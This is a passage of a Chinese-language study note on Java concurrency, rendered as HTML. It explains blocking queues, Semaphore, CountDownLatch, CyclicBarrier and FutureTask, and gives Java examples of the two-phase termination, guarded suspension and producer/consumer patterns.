<li>俩把锁： 同一时刻，可以允许俩个线程同时执行(一个生产者与一个消费者)<ul>
<li>生产者与生产者仍然串行</li>
<li>消费者与消费者仍然串行</li>
</ul>
</li>
</ul>
</blockquote>
<p><strong>线程安全分析</strong></p>
<blockquote>
<p>putLock保证last节点的线程，takeLock保证head节点的线程安全</p>
</blockquote>
<ul>
<li>节点大于2(包括Dummy占位节点)，俩把锁保证入队与出队没有竞争</li>
<li>等于2(一个Dummy节点，一个正常节点)，仍然是俩把锁锁住俩个对象，不会竞争</li>
<li>等于1，take线程会被notEmpty条件阻塞，有竞争，会阻塞。</li>
</ul>
<h5 id="4-3-ArrayBlockingQueue"><a href="#4-3-ArrayBlockingQueue" class="headerlink" title="4.3 ArrayBlockingQueue"></a>4.3 ArrayBlockingQueue</h5><ul>
<li><p>Linked支持有界，Array强制有界</p>
</li>
<li><p>Array需要提前初始化Node数组，入队Node是提前创建好的。</p>
<p>Linked是懒惰的，入队会生成新的Node</p>
</li>
<li><p>Linked俩把锁，Array一把锁。</p>
</li>
</ul>
<h5 id="4-4-ConcurrentLinkedQueue"><a href="#4-4-ConcurrentLinkedQueue" class="headerlink" title="4.4 ConcurrentLinkedQueue"></a>4.4 ConcurrentLinkedQueue</h5><blockquote>
<p>类似LinkedBlockingQueue，<strong>都是使用俩把【锁】,使用的CAS实现，应用于并发要求更多的场景</strong></p>
</blockquote>
<blockquote>
<p>应用于Tomcat的Connector结构。</p>
</blockquote>
<h5 id="4-5-CopyOnWriterArrayList"><a href="#4-5-CopyOnWriterArrayList" class="headerlink" title="4.5 CopyOnWriterArrayList"></a>4.5 CopyOnWriterArrayList</h5><img src="https://csn.damyoung.cn/image-20201008224232404.png" alt="image-20201008224232404" style="zoom:67%;" />

<blockquote>
<p><strong>写入时拷贝</strong>，<strong>增删改即写操作</strong>会将底层数组拷贝一份，更改操作在新数组上执行</p>
<p>这时不影响其他线程的<strong>并发读，读写分离(并发 读写)</strong></p>
<ul>
<li>读写操作，读操作都未加锁</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201008224318927.png" alt="image-20201008224318927" style="zoom:67%;" />



<h4 id="5、Semaphore"><a href="#5、Semaphore" class="headerlink" title="5、Semaphore"></a>5、Semaphore</h4><blockquote>
<p>信号量，用来限制能<strong>同时访问共享资源</strong>的<strong>线程</strong>上限</p>
<p><strong>ps：</strong>限制线程数，而不是限制资源数(Tomcat LimitLatch)。</p>
</blockquote>
<blockquote>
<p>也是实现AQS同步器</p>
<p>Semaphore 有两种模式，公平模式和非公平模式。</p>
<ul>
<li>公平模式： 调用<code>acquire</code>的顺序就是获取许可证的顺序，遵循<code>FIFO</code>；</li>
<li>非公平模式： 抢占式的。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Semaphore</span><span class="params">(<span class="keyword">int</span> permits)</span> </span>&#123;</span><br><span class="line">    sync = <span class="keyword">new</span> NonfairSync(permits);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Semaphore</span><span class="params">(<span class="keyword">int</span> permits, <span class="keyword">boolean</span> fair)</span> </span>&#123;</span><br><span class="line">    sync = fair ? <span class="keyword">new</span> FairSync(permits) : <span class="keyword">new</span> NonfairSync(permits);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建Semaphore对象(限制线程数,fair?)</span></span><br><span class="line">Semaphore semaphore = <span class="keyword">new</span> Semaphore(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//添加许可，默认一次只用掉一个信号量，也可以参数传多个  </span></span><br><span class="line">            semaphore.acquire();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;running...&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;end&quot;</span>);</span><br><span class="line">            <span class="comment">//释放许可</span></span><br><span class="line">            semaphore.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="string">&quot;&quot;</span>+i).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="6、CountdownLatch"><a href="#6、CountdownLatch" class="headerlink" title="6、CountdownLatch"></a>6、CountdownLatch</h4><blockquote>
<p>用来进行线程同步协作，等待所有线程完成倒计时</p>
<p>其中构造方法用来初始化等待计数值，await()等待计数归零，countDown() 用来让计数–</p>
</blockquote>
<h5 id="6-1-使用"><a href="#6-1-使用" class="headerlink" title="6.1 使用"></a>6.1 使用</h5><blockquote>
<p>内部维护了一个计数器<code>cnt</code>，每次调用<code>countDown()</code>方法会让计数器的值减1，减到0的时候，它表示所有的线程已经完成了任务，然后在闭锁上等待的线程就可以恢复执行任务,那些之前调用<code>await()</code>方法而在等待的线程就会被唤醒。</p>
</blockquote>
<p><strong>不足</strong></p>
<p><code>CountDownLatch</code>是一次性的，计数器的值只能在构造方法中初始化一次，之后没有任何机制再次对其设置值，当<code>CountDownLatch</code>使用完毕后，它不能再次被使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CountDownLatch latch=<span class="keyword">new</span> CountDownLatch(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;t1.begin..&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;t1.end&quot;</span>);</span><br><span class="line">&#125;).start();</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;t2.begin..&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;t2.end&quot;</span>);</span><br><span class="line">&#125;).start();</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;t3.begin..&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;t3.end..&quot;</span>);</span><br><span class="line">&#125;).start();</span><br><span class="line">System.out.println(<span class="string">&quot;waiting..&quot;</span>);</span><br><span class="line">latch.await();</span><br><span class="line">System.out.println(<span class="string">&quot;..end&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="6-2-配合线程池使用"><a href="#6-2-配合线程池使用" class="headerlink" title="6.2 配合线程池使用"></a>6.2 配合线程池使用</h5><blockquote>
<p>等待多个远程调用结束</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">CountDownLatch latch=<span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line">Random r=<span class="keyword">new</span> Random();</span><br><span class="line">String[] all =<span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;<span class="number">10</span> ; j++) &#123;</span><br><span class="line">    <span class="keyword">int</span> k=j;</span><br><span class="line">    pool.execute(()-&gt;&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(r.nextInt(<span class="number">100</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            all[k]=i+<span class="string">&quot;%&quot;</span>;</span><br><span class="line">            <span class="comment">//在同一行变化。</span></span><br><span class="line">            System.out.print(<span class="string">&quot;\r&quot;</span>+ Arrays.toString(all));</span><br><span class="line">        &#125;</span><br><span class="line">        latch.countDown();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">latch.await();</span><br><span class="line">System.out.println(<span class="string">&quot;游戏开始&quot;</span>);</span><br><span class="line">pool.shutdown();</span><br></pre></td></tr></table></figure>



<h4 id="7、Cyclicbarrier"><a href="#7、Cyclicbarrier" class="headerlink" title="7、Cyclicbarrier"></a>7、Cyclicbarrier</h4><blockquote>
<p>循环栅栏，用来进行线程协作，等待线程满足某个计数。</p>
<ul>
<li>计数可以恢复，无需重新创建对象</li>
<li>存在的问题：<strong>线程数和计数值要一致</strong></li>
</ul>
<p>构造时设置计数个数， await()计数-1</p>
<p><code>CyclicBarrier</code>有两个构造函数，其中<code>parties</code>指示计数器的初始值，<code>barrierAction</code>在所有线程都到达屏障的时候会执行一次。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">CyclicBarrier barrier=<span class="keyword">new</span> CyclicBarrier(<span class="number">2</span>,()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1,task2,finish..&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//若线程数为3</span></span><br><span class="line"><span class="comment">//task1,taks2,task1</span></span><br><span class="line"><span class="comment">//由于task1(1s) task2(2s),会导致是俩次task1减去计数。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    pool.submit(()-&gt;&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;t1.begin..&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="comment">//计数-1</span></span><br><span class="line">            barrier.await();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | BrokenBarrierException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;t1.end&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    pool.submit(()-&gt;&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;t2.begin..&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            barrier.await();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | BrokenBarrierException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;t2.end&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">pool.shutdown();</span><br></pre></td></tr></table></figure>



<h4 id="8、CyclicBarrier和CountDownLatch的区别"><a href="#8、CyclicBarrier和CountDownLatch的区别" class="headerlink" title="8、CyclicBarrier和CountDownLatch的区别"></a>8、CyclicBarrier和CountDownLatch的区别</h4><ul>
<li><p><code>CountDownLatch</code>是计数器，只能使用一次，而<code>CyclicBarrier</code>计数器提供了<code>reset</code>方法，可以多次使用。</p>
</li>
<li><p><code>CountDownLatch</code>的设计思想强调的是一个（多个）线程等待其他线程执行完成后才能执行</p>
<p><code>CyclicBarrier</code>则是强调要多个线程都到达某一个条件，才能一起执行后续步骤。</p>
</li>
</ul>
<h4 id="9、FutureTask"><a href="#9、FutureTask" class="headerlink" title="9、FutureTask"></a>9、FutureTask</h4><p><code>Callable</code>接口它可以有返回值，返回值通过<code>Future</code>进行封装。<code>FutureTask</code>实现了<code>RunnableFuture</code>接口，该接口继承自<code>Runnable</code>和<code>Future</code>接口，这使得<code>FutureTask</code>既可以当做一个任务执行，也可以有返回值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FutureTask</span>&lt;<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">RunnableFuture</span>&lt;<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">interface</span> <span class="title">RunnableFuture</span>&lt;<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">Runnable</span>, <span class="title">Future</span>&lt;<span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>FutureTask</code>适用于<strong>异步获取执行结果或取消执行任务</strong>的场景。当一个任务需要执行很久时，就可以使用<code>FutureTask</code>进行封装，主线程在完成自己的任务后再回来获取结果。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FutureTaskExample</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        FutureTask&lt;Integer&gt; futureTask = <span class="keyword">new</span> FutureTask&lt;Integer&gt;(<span class="keyword">new</span> Callable&lt;Integer&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Integer <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">10</span>);</span><br><span class="line">                    result += i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Thread computeThread = <span class="keyword">new</span> Thread(futureTask);</span><br><span class="line">        computeThread.start();</span><br><span class="line"></span><br><span class="line">        Thread otherThread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;other task is running...&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        otherThread.start();</span><br><span class="line">        System.out.println(futureTask.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="九、多线程设计模式"><a href="#九、多线程设计模式" class="headerlink" title="九、多线程设计模式"></a>九、多线程设计模式</h3><h4 id="1、俩阶段终止模式"><a href="#1、俩阶段终止模式" class="headerlink" title="1、俩阶段终止模式"></a>1、俩阶段终止模式</h4><h5 id="1-1-interrupt"><a href="#1-1-interrupt" class="headerlink" title="1.1 interrupt"></a>1.1 interrupt</h5><ul>
<li>当出现打断标志时，会将中断标志置为true</li>
<li>sleep时被打断，会抛出<code>interruptException</code>,并需要重新设置打断标志，在下次while循环中退出</li>
</ul>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201008224824308.png" alt="image-20201008224824308" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MonitorInterrupt</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        TwpPhaseTermination twpPhaseTermination = <span class="keyword">new</span> TwpPhaseTermination();</span><br><span class="line">        twpPhaseTermination.start();</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;设置中断标志&quot;</span>);</span><br><span class="line">        twpPhaseTermination.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TwpPhaseTermination</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Thread monitor;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//启动监控线程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        monitor=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="keyword">boolean</span> interrupted = Thread.currentThread().isInterrupted();</span><br><span class="line">                <span class="keyword">if</span> (interrupted)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;中断标志为true,中断线程&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//中断标志为false.进入睡眠</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="comment">//在sleep时被打断会抛出异常</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//重新设置标志,抛出异常时标志会消失，需要重新设置</span></span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        monitor.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//停止监控线程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        monitor.interrupt();</span><br><span class="line">        System.out.println(<span class="string">&quot;中断线程&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="1-2-volatile"><a href="#1-2-volatile" class="headerlink" title="1.2 volatile"></a>1.2 volatile</h5><blockquote>
<p><strong>利用volatile的可见性进行改进</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TwpPhaseTermination</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Thread monitor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> stop=<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//启动监控线程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        monitor=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (stop)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;标志为true,中断线程&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//中断标志为false.进入睡眠</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="comment">//在sleep时被打断会抛出异常</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;monitor&quot;</span>);</span><br><span class="line">        monitor.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//停止监控线程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        stop=<span class="keyword">true</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;中断线程&quot;</span>);</span><br><span class="line">        monitor.interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、同步保护性暂停"><a href="#2、同步保护性暂停" class="headerlink" title="2、同步保护性暂停"></a>2、同步保护性暂停</h4><blockquote>
<p>Guarded Suspension ，<strong>用在一个线程等待另一个线程的结果</strong></p>
<ul>
<li>有<strong>一个结果</strong>从一个线程传递到另一个线程，让他们关联同一个<code>GuardedObject</code></li>
<li>有结果<strong>不断</strong>的从一个线程传递到另一个线程，使用消息队列(生产者消费者)</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201009210302949.png" alt="image-20201009210302949" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GuardObjectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        GuardObject g=<span class="keyword">new</span> GuardObject();</span><br><span class="line">        <span class="comment">//等待线程2结果</span></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程1开始&quot;</span>);</span><br><span class="line">            <span class="comment">//等待结果</span></span><br><span class="line">            System.out.println(g.get());</span><br><span class="line">        &#125;,<span class="string">&quot;线程1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程2开始&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            g.complete(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;线程2执行complete&quot;</span>);</span><br><span class="line">        &#125;,<span class="string">&quot;线程2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuardObject</span></span>&#123;</span><br><span class="line">    <span class="comment">//结果</span></span><br><span class="line">    <span class="keyword">private</span> Object response;</span><br><span class="line">    <span class="comment">//获取结果</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="comment">//没有结果</span></span><br><span class="line">            <span class="keyword">while</span> (response==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//产生结果</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">complete</span><span class="params">(Object response)</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.response=response;</span><br><span class="line">            <span class="keyword">this</span>.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="3、生产者-消费者模式"><a href="#3、生产者-消费者模式" class="headerlink" title="3、生产者/消费者模式"></a>3、生产者/消费者模式</h4><img src="https://csn.damyoung.cn/image-20201003095739174.png" alt="image-20201003095739174" style="zoom:80%;" />

<blockquote>
<ul>
<li>生产者负责产生结果数据，不关心数据该如何处理。消费者专心处理结果数据</li>
<li>消息队列有<strong>容量限制</strong>，满时不会再加入数据，空时不会再消耗数据</li>
<li>JDK各种阻塞队列，采用的就是这种模式</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> *  生产者消费者模式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConConsumDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MessageQueue messageQueue=<span class="keyword">new</span> MessageQueue(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> id=i;</span><br><span class="line">            <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">                messageQueue.put(<span class="keyword">new</span> Message(id,<span class="string">&quot;值&quot;</span>+id));</span><br><span class="line">            &#125;,<span class="string">&quot;生产者&quot;</span>).start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//消费者</span></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(messageQueue.take());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 消息队列类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MessageQueue</span></span>&#123;</span><br><span class="line">    <span class="comment">//消息队列集合,实现双向队列</span></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Message&gt; linkedList=<span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="comment">//队列容量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MessageQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取消息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">take</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查队列是否为空</span></span><br><span class="line">        <span class="keyword">synchronized</span> (linkedList)&#123;</span><br><span class="line">            <span class="keyword">while</span> (linkedList.isEmpty())&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    linkedList.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Message message = linkedList.removeFirst();</span><br><span class="line">            <span class="comment">//唤醒put中wait</span></span><br><span class="line">            linkedList.notifyAll();</span><br><span class="line">            <span class="keyword">return</span> message;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//存入消息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(Message message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (linkedList)&#123;</span><br><span class="line">            <span 